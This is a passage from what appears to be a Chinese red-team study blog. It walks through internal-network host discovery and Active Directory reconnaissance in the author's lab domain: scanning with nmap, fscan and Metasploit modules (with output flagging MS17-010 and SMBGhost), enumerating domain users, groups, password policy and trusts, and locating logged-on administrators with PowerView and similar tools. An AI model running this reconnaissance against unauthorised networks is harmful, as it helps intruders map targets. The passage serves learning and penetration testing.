No-------------------------------------------------------------------------------Scan finished at Tue Feb 23 22:07:49 20213 IPs and 0 ports scanned in 0 hours 0 mins 9.16 secs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="9、telnet"><a href="#9、telnet" class="headerlink" title="9、telnet"></a>9、telnet</h2><p>通过 telnet 探测 445 端口或者其他端口判断主机存活。</p><pre class="line-numbers language-none"><code class="language-none">for &#x2F;l %a in (1,1,254) do start &#x2F;min &#x2F;low telnet 192.168.7.%a 445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="10、tcping"><a href="#10、tcping" class="headerlink" title="10、tcping"></a>10、tcping</h2><p>tcping.exe 是一个命令行程序，其操作类似于“ping”，但它通过 TCP 工作，下载地址：<a href="https://elifulkerson.com/projects/tcping.php">https://elifulkerson.com/projects/tcping.php</a></p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;tcping.exe -n 1 192.168.7.7 445Probing 192.168.7.7:445&#x2F;tcp - Port is open - time&#x3D;1.719msPing statistics for 192.168.7.7:445     1 probes sent.     1 successful, 0 failed.  (0.00% fail)Approximate trip times in milli-seconds:     Minimum &#x3D; 1.719ms, Maximum &#x3D; 1.719ms, Average &#x3D; 1.719ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11、cping"><a href="#11、cping" class="headerlink" title="11、cping"></a>11、cping</h2><p>k8 团队出品，下载地址：<a href="https://www.lanzous.com/i3837ne#Window">https://www.lanzous.com/i3837ne#Window</a></p><p>下载解压后可以看到很多个 exe 文件，其分别代表了.net 编译版本，编译版本对应系统如下：</p><pre class="line-numbers language-none"><code class="language-none">XP&#x2F;2003(已淘汰,用户少,使用的大部分也会装.net,因为好多app需要连驱动都要.net,具体看安装版本一般2.0)Vista       2.0(基本上也没多少用户)Win7&#x2F;2008   2.0 3.0 3.5Win8&#x2F;2012   4.0Win8.1      4.0 4.5Win10&#x2F;2016  4.0 4.6 (4.5未测应该也行)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;cping40.exe scan osver 192.168.7.1 192.168.7.255Scan OS version192.168.7.1---192.168.7.255Segment: 192.168.7.0&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;IP              MAC               HostName        OSver192.168.7.7     00-0C-29-1D-82-CF dc.teamssix.com [Win 2008 R2 Datacenter 7601 SP 1]192.168.7.110   00-0C-29-DC-01-0D daniel10.teamssix.com []192.168.7.107   00-0C-29-A9-62-98 daniel7.teamssix.com [Win 7 Professional 7601 SP 1]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Count:3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="12、fscan"><a href="#12、fscan" class="headerlink" title="12、fscan"></a>12、fscan</h2><p>影舞者大佬写的一款工具，使用起来感觉很是方便，工具下载地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;fscan.exe -h 192.168.7.1-255 -p 22,445   ___                              _  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &#39;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;&#x2F; &#x2F;_\\_____\__ \ (__| | | (_| | (__|   &lt;\____&#x2F;     |___&#x2F;\___|_|  \__,_|\___|_|\_\                     fscan version: 1.5.1scan start(icmp) Target &#39;192.168.7.7&#39; is alive(icmp) Target &#39;192.168.7.110&#39; is alive(icmp) Target &#39;192.168.7.107&#39; is aliveicmp alive hosts len is: 3192.168.7.110:445 open192.168.7.7:445 open192.168.7.107:445 open192.168.7.110 CVE-2020-0796 SmbGhost Vulnerable192.168.7.110  (Windows 10 Pro 18363)[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)[+] 192.168.7.107       MS17-010        (Windows 7 Professional 7601 Service Pack 1)scan end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="13、Nmap"><a href="#13、Nmap" class="headerlink" title="13、Nmap"></a>13、Nmap</h2><p>提到扫描自然不能少了 nmap，nmap 支持多种协议的扫描，具体如下：</p><pre class="line-numbers language-none"><code class="language-none">ARP 扫描：nmap -PR -sn 192.168.7.0&#x2F;24ICMP 扫描：nmap ‐sP ‐PI 192.168.7.0&#x2F;24 ‐T4ICMP 扫描：nmap ‐sn ‐PE ‐T4 192.168.7.0&#x2F;24SNMP 扫描：nmap -sU --script snmp-brute 192.168.7.0&#x2F;24 -T4UDP 扫描：nmap -sU -T5 -sV --max-retries 1 192.168.7.7 -p 500NetBIOS 扫描：nmap --script nbstat.nse -sU -p137 192.168.7.0&#x2F;24 -T4SMB 扫描：nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.7.0&#x2F;24……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="14、MSF"><a href="#14、MSF" class="headerlink" title="14、MSF"></a>14、MSF</h2><p>除了 Nmap 之外，万能的 MSF 自然也不能少，MSF 能够进行主机存活探测的模块如下：</p><pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probeauxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweepauxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweepauxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbnameauxiliary&#x2F;scanner&#x2F;snmp&#x2F;snmp_enumauxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了上述工具外，还有 netdiscover、snscan 等工具可用于内网主机存活探测，在这其中有些工具因为使用起来感觉探测的不是很理想等原因，在此就不记录了，如果读者感兴趣的话可自行尝试玩玩。</p><blockquote><p>参考文章：</p><p><a href="https://soapffz.com/sec/21.html">https://soapffz.com/sec/21.html</a></p><p><a href="https://micro8.gitbook.io/micro8/contents-1">https://micro8.gitbook.io/micro8/contents-1</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/13722474.html">https://www.cnblogs.com/xiaozi/p/13722474.html</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11908260.html">https://www.cnblogs.com/-mo-/p/11908260.html</a></p><p><a href="https://blog.csdn.net/weixin_42918771/article/details/108798729">https://blog.csdn.net/weixin_42918771/article/details/108798729</a></p><p><a href="https://blog.csdn.net/qq_45366449/article/details/113650656">https://blog.csdn.net/qq_45366449/article/details/113650656</a></p><p><a href="https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/">https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】4、域内信息收集</title>
      <link href="//210224-210341.html"/>
      <url>//210224-210341.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、判断是否存在域"><a href="#1、判断是否存在域" class="headerlink" title="1、判断是否存在域"></a>1、判断是否存在域</h2><h3 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h3><p>查看网关 IP 地址、DNS 的 IP 地址、域名、本机是否和 DNS 服务器处于同一网段。    </p><pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; ipconfig &#x2F;allWindows IP 配置   主 DNS 后缀 . . . . . . . . . .  : teamssix.com   DNS 后缀搜索列表  . . . . . . . . : teamssix.com以太网适配器 Ethernet0:   IPv4 地址 . . . . . . . . . . .. : 192.168.7.110   子网掩码  . . . . . . . . . . . . : 255.255.255.0   默认网关. . . . . . . . . . . . . : 192.168.7.1   DNS 服务器  . . . . . . . . . . . : 192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着使用 nslookup 解析域名的 IP 地址，查看是否与 DNS 服务器为同一 IP</p><pre class="line-numbers language-none"><code class="language-none">nslookup teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nslookup teamssix.com服务器:  UnKnownAddress:  192.168.7.7名称:    teamssix.comAddress:  192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="系统详细信息"><a href="#系统详细信息" class="headerlink" title="系统详细信息"></a>系统详细信息</h3><pre class="line-numbers language-none"><code class="language-none">systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; systeminfo | findstr 域:域: teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="当前登录域与域用户"><a href="#当前登录域与域用户" class="headerlink" title="当前登录域与域用户"></a>当前登录域与域用户</h3><pre class="line-numbers language-none"><code class="language-none">net config workstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net config workstation | findstr 域工作站域                    TEAMSSIX工作站域 DNS 名称            teamssix.com登录域                      TEAMSSIX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><pre class="line-numbers language-none"><code class="language-none">net time &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net time &#x2F;domain\\dc.teamssix.com 的当前时间是 2021&#x2F;2&#x2F;13 20:49:56命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2、收集域内基础信息"><a href="#2、收集域内基础信息" class="headerlink" title="2、收集域内基础信息"></a>2、收集域内基础信息</h2><h3 id="查看域"><a href="#查看域" class="headerlink" title="查看域"></a>查看域</h3><pre class="line-numbers language-none"><code class="language-none">net view &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net view &#x2F;domainDomain-------------------------------------------------------------------------------TEAMSSIX命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看域内计算机"><a href="#查看域内计算机" class="headerlink" title="查看域内计算机"></a>查看域内计算机</h3><pre class="line-numbers language-none"><code class="language-none">net view &#x2F;domain:domain_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net view &#x2F;domain:teamssix服务器名称            注解-------------------------------------------------------------------------------\\DANIEL10\\DANIEL7\\DC命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看域内用户组列表"><a href="#查看域内用户组列表" class="headerlink" title="查看域内用户组列表"></a>查看域内用户组列表</h3><pre class="line-numbers language-none"><code class="language-none">net group &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net group &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。\\dc.teamssix.com 的组帐户-------------------------------------------------------------------------------*Admins*Domain Admins*Domain Computers*Domain Users*Enterprise Admins命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看域用户组信息"><a href="#查看域用户组信息" class="headerlink" title="查看域用户组信息"></a>查看域用户组信息</h3><pre class="line-numbers language-none"><code class="language-none">net group &quot;Enterprise Admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net group &quot;Enterprise Admins&quot; &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。组名     Enterprise Admins注释     指定的公司系統管理員成员-------------------------------------------------------------------------------Administrator命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看域密码策略信息"><a href="#查看域密码策略信息" class="headerlink" title="查看域密码策略信息"></a>查看域密码策略信息</h3><pre class="line-numbers language-none"><code class="language-none">net accounts &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net accounts &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。强制用户在时间到期之后多久必须注销?:     从不密码最短使用期限(天):                  1密码最长使用期限(天):                  42密码长度最小值:                        7保持的密码历史记录长度:                 24锁定阈值:                            从不锁定持续时间(分):                      30锁定观测窗口(分):                      30计算机角色:                           PRIMARY命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看域信任信息"><a href="#查看域信任信息" class="headerlink" title="查看域信任信息"></a>查看域信任信息</h3><pre class="line-numbers language-none"><code class="language-none">nltest &#x2F;domain_trusts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nltest &#x2F;domain_trusts域信任的列表:    0: TEAMSSIX teamssix.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、收集域用户和管理员信息"><a href="#3、收集域用户和管理员信息" class="headerlink" title="3、收集域用户和管理员信息"></a>3、收集域用户和管理员信息</h2><h3 id="查询域用户列表"><a href="#查询域用户列表" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h3><pre class="line-numbers language-none"><code class="language-none">net user &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net user &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。\\dc.teamssix.com 的用户帐户-------------------------------------------------------------------------------admin                    Administrator                    daniel10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查询域用户详细信息"><a href="#查询域用户详细信息" class="headerlink" title="查询域用户详细信息"></a>查询域用户详细信息</h3><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; wmic useraccount get &#x2F;allAccountType  Caption                        Description                                                     Disabled  Domain    FullName                               InstallDate  LocalAccount  Lockout  Name                  PasswordChangeable  PasswordExpires  PasswordRequired  SID                                            SIDType  Status512          DANIEL10\Administrator         管理计算机(域)的内置帐户                                        TRUE      DANIEL10                                                      TRUE          FALSE    Administrator         TRUE                FALSE            TRUE              S-1-5-21-1097120846-822447287-3576165687-500   1        Degraded512          DANIEL10\DefaultAccount        系统管理的用户帐户。                                            TRUE      DANIEL10                                                      TRUE          FALSE    DefaultAccount        TRUE                FALSE            FALSE             S-1-5-21-1097120846-822447287-3576165687-503   1        Degraded<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查询存在的用户"><a href="#查询存在的用户" class="headerlink" title="查询存在的用户"></a>查询存在的用户</h3><pre class="line-numbers language-none"><code class="language-none">dsquery user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; dsquery user&quot;CN&#x3D;Administrator,CN&#x3D;Users,DC&#x3D;teamssix,DC&#x3D;com&quot;&quot;CN&#x3D;Guest,CN&#x3D;Users,DC&#x3D;teamssix,DC&#x3D;com&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>常用的 dsquery 命令</p><pre class="line-numbers language-none"><code class="language-none">dsquery computer - 查找目录中的计算机dsquery contact - 查找目录中的联系人dsquery subnet - 查找目录中的子网dsquery group - 查找目录中的组dsquery ou - 查找目录中的组织单位dsquery site - 查找目录中的站点dsquery server - 查找目录中的域控制器dsquery user - 查找目录中的用户dsquery quota - 查找目录中的配额dsquery partition - 查找目录中的分区dsquery * - 用通用的 LDAP 查询查找目录中的任何对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、查找域控制器"><a href="#4、查找域控制器" class="headerlink" title="4、查找域控制器"></a>4、查找域控制器</h2><h3 id="查看域控器机器名"><a href="#查看域控器机器名" class="headerlink" title="查看域控器机器名"></a>查看域控器机器名</h3><pre class="line-numbers language-none"><code class="language-none">nltest &#x2F;DCLIST:teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nltest &#x2F;DCLIST:teamssix获得域“teamssix”中 DC 的列表(从“\\DC”中)。    dc.teamssix.com [PDC]  [DS] 站点: Default-First-Site-Name此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看域控器主机名"><a href="#查看域控器主机名" class="headerlink" title="查看域控器主机名"></a>查看域控器主机名</h3><pre class="line-numbers language-none"><code class="language-none">nslookup -type&#x3D;SRV _ldap._tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nslookup -type&#x3D;SRV _ldap._tcp_ldap._tcp.teamssix.com SRV service location:          priority       &#x3D; 0          weight         &#x3D; 100          port           &#x3D; 389          svr hostname   &#x3D; dc.teamssix.comdc.teamssix.com internet address &#x3D; 192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">netdom query pdc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; netdom query pdc域的主域控制器:DC命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看域控器组"><a href="#查看域控器组" class="headerlink" title="查看域控器组"></a>查看域控器组</h3><pre class="line-numbers language-none"><code class="language-none">net group &quot;domain controllers&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net group &quot;domain controllers&quot; &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。组名     Domain Controllers注释     在網域所有的網域控制站成员-------------------------------------------------------------------------------DC$命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、定位域管理员"><a href="#5、定位域管理员" class="headerlink" title="5、定位域管理员"></a>5、定位域管理员</h2><h3 id="psloggedon"><a href="#psloggedon" class="headerlink" title="psloggedon"></a>psloggedon</h3><p>在 Windows 上使用 <code>net session</code> 可以查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户。</p><p>psloggedon 下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p><pre class="line-numbers language-none"><code class="language-none">psloggedon.exe [-] [-l] [-x] [\\computername|username]-显示支持的选项和用于输出值的单位。-l仅显示本地登录，不显示本地和网络资源登录。-x不显示登录时间。\\computername指定要列出登录信息的计算机的名称。Username指定用户名，在网络中搜索该用户登录的计算机。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; PsLoggedon.exe -l \\192.168.7.7Users logged on locally:2021&#x2F;2&#x2F;13 20:53:08         TEAMSSIX\Administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="PVEFindADUser"><a href="#PVEFindADUser" class="headerlink" title="PVEFindADUser"></a>PVEFindADUser</h3><p>PVEFindADUser 用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务器和计划任务的用户，该工具需要管理员权限。</p><p>PVEFindADUser 下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p><pre class="line-numbers language-none"><code class="language-none">-h显示帮助信息-u检测程序是否有新版本-current [&quot;username&quot;]-current参数显示每台PC上当前登录的用户在域中。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC-noping阻止尝试枚举用户登录名之前对目标计算机执行ping命令-target此可选参数允许您指定要查询的主机。如果未指定此-target参数，则将查询当前域中的所有主机。如果决定指定-target，然后指定以逗号分隔的主机名。查询结果将被输出到report.csv文件中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; PVEFindADUser.exe -current [+] Finding currently logged on users ? true [+] Finding last logged on users ? false [+] Enumerating all computers... [+] Number of computers found : 15 [+] Launching queries     [+] Processing host : dc.teamssix.com (Windows Server 2008 R2 Datacenter;Service Pack 1)         - Logged on user : teamssix\administrator     [+] Processing host : daniel7.teamssix.com (Windows 7 专业版;Service Pack 1)     [+] Processing host : daniel10.teamssix.com (Windows 10 专业版) [+] Report written to report.csv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="netview"><a href="#netview" class="headerlink" title="netview"></a>netview</h3><p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。</p><p>Netview 下载地址：<a href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p><pre class="line-numbers language-none"><code class="language-none">-h               显示帮助信息-f filename.txt  指定要提取主机列表的文件-e filename.txt  指定要排除的主机名的文件-o filename.txt  将所有输出重定向到指定的文件-d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表-g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索-c               对已找到的共享目录&#x2F;文件的访问权限进行检查-i interval      枚举主机之间等待的秒数-j jitter        应用于间隔的抖动百分比（0.0-1.0）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; netview.exe -d[+] Number of hosts: 3[+] Host: DANIEL10Enumerating AD Info[+] DANIEL10 - Comment -[+] D - OS Version - 10.0[+] DANIEL10 - MSSQL ServerEnumerating IP Info[+] (null) - IPv4 Address - 192.168.7.110Enumerating Share InfoEnumerating Session InfoEnumerating Logged-on Users[+] DANIEL10 - Logged-on - TEAMSSIX\daniel10[+] Host: DCEnumerating AD Info[+] DC - Comment -[+] D - OS Version - 6.1[+] DC - Domain ControllerEnumerating IP Info[+] (null) - IPv4 Address - 192.168.7.7……内容较多故省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h3><p>常用的 NSE 脚本如下：</p><p><code>smb-enum-domains.nse</code>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</p><p><code>smb-enum-users.nse</code>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</p><p><code>smb-enum-shares.nse</code>:遍历远程主机的共享目录</p><p><code>smb-enum-processes.nse</code>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</p><p><code>smb-enum-sessions.nse</code>:获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p><p><code>smb-os-discovery.nse</code>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p><p>NES 脚本下载地址：<a href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nmap --script&#x3D;smb-os-discovery.nse -p 445 192.168.7.107Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-21 09:44 CSTNmap scan report for 192.168.7.107Host is up (0.00053s latency).PORT    STATE SERVICE445&#x2F;tcp open  microsoft-dsHost script results:| smb-os-discovery:|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)|   OS CPE: cpe:&#x2F;o:microsoft:windows_7::sp1:professional|   Computer name: daniel7|   NetBIOS computer name: DANIEL7\x00|   Domain name: teamssix.com|   Forest name: teamssix.com|   FQDN: daniel7.teamssix.com|_  System time: 2021-02-21T09:44:33+08:00Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-23_17-38-11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="PowerView-脚本"><a href="#PowerView-脚本" class="headerlink" title="PowerView 脚本"></a>PowerView 脚本</h3><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code> $Env:PSModulePath</code>查看，我这里将其复制到了C:\Program Files\WindowsPowerShell\Modules文件夹内。</p><p>接着在 powershell中输入<code> Import-Module PowerView</code>即可导入PowerView，使用<code> Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\daniel10&gt; Import-Module PowerViewPS C:\Users\daniel10&gt; Get-Command -Module PowerViewCommandType     Name                                               Version    Source-----------     ----                                               -------    ------Alias           Find-UserTrustGroup                                1.0        PowerViewAlias           Get-ComputerProperties                             1.0        PowerView……内容较多故省略……<span aria-hidden="true" 